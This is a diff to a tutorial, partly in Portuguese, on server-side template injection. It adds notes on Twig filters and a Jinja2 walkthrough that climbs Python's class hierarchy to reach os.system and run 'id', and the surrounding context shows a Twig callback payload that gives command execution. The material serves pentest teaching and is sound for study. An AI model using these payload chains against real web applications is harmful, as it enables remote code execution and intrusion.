@@ -16,9 +16,11 @@ A common way of doing this is to inject arbitrary mathematical operations using 
 
 You should be aware that the same payload can sometimes return a successful response in more than one template language. For example, the payload `{{7*'7'}}` returns `49` in Twig and `7777777` in Jinja2. Therefore, it is important not to jump to conclusions based on a single successful response.
 
-## Twig Template
+## Filters
 
-Podemos dar uma olhada na documentação do [Twig](https://twig.symfony.com/doc/3.x/) e ver que existem várias funções.
+Dentro do templates, há filtros que servem para executar determinada funções. Por exemplo `{{"test"|upper}}` irá colocar a string `test` em maiúsculo. Podemos dar uma olhada na documentação do [Twig](https://twig.symfony.com/doc/3.x/) e ver que existem várias funções e filtros.
+
+## Twig Template
 
 E se pudessemos criar nossa própria função e adicionar ele dentro do Twig? É possível registrar uma função de callback a partir do sistema de template do Twig. Vamos ver como conseguimos fazer isso.
 
@@ -39,6 +41,33 @@ http://10.10.0.7/?email={{_self.env.registerUndefinedFucntionCallback('system')}
 {% endcode %}
 
 ## Jinja2 Template
+
+```
+>>> string = "1337"
+
+>>> string.__class__.mro()
+[<class 'str'>, <class 'object'>]
+
+>>> string.__class__.mro()[1]
+<class 'object'>
+
+>> string.__class__.mro()[1].__subclasses__()
+[<class 'type'>, <class 'async_generator'>, <class 'bytearray_iterator'>, <class 'bytearray'>...
+```
+
+img jinja2
+
+```
+>>> string.__class__.mro()[1].__subclasses__()[155]
+<class 'os._wrap_close'>
+
+>> string.__class__.mro()[1].__subclasses__()[155].__init__.__globals__
+{'__name__': 'os', '__doc__': "OS routines for NT or Posix depending on what system we're on.\n\nThis exports:\n  - all functions ...
+
+>>> string.__class__.mro()[1].__subclasses__()[155].__init__.__globals__['system']('id')
+uid=1000(nizyuu) gid=1000(nizyuu) groups=1000(nizyuu),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),100(users),114(lpadmin),984(docker)
+0
+```
 
 https://www.intigriti.com/researchers/blog/hacking-tools/exploiting-server-side-template-injection-ssti
 
